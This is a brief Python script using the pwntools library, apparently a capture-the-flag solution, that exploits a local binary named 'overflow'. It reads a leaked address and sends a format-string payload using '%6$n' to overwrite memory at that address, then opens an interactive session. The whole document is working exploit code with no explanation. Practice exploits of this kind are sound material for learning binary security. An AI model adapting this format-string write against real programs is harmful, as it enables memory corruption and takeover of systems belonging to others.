from pwn import *

p = process('./overflow')

buf = p.recvuntil(b'\n')

log.success(buf)

c_addr = int(buf[2 : ], 16)

log.success(c_addr) 

payload = p32(c_addr) + b'%12d%6$n';

p.sendline(payload)

print(p.recv())

p.interactive()


